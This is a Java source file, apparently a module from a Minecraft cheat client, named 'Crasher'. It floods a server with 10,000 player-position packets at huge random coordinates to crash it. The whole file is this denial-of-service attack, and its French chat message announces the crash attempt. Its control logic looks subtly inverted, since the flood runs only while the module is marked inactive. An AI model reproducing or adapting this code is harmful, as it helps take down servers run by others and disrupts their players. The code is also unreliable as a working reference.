package neko.module.modules.misc;

import neko.module.Category;
import neko.module.Module;
import neko.utils.Utils;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C0APacketAnimation;

public class Crasher extends Module {
	
	int loop;
	public static boolean active;
	
	public Crasher() {
		super("Crasher", -1, Category.MISC);
	}
	
	public void onEnabled() {		
		this.active = true;
		Utils.addChat("§6Veuillez patienter... Nous essayons le crash.");
		super.onEnabled();
	}
	
	public void onDisabled() {
		this.active = false;
		super.onDisabled();
	}	

	public void setValues() {
		this.values = "";
	}
	
	@Override
	public void onUpdate() {
		if (this.active)
			return;
		++this.loop;
		if (this.loop > 6) {
			int spam = 0;
			while (spam < 10000) {
				mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition((Math.random()*10000000+10000000), (Math.random()*10000000+10000000), (Math.random()*10000000+10000000), true));
				++spam;
				this.loop = 0;
			}
			super.onUpdate();
		}
	}
	
}
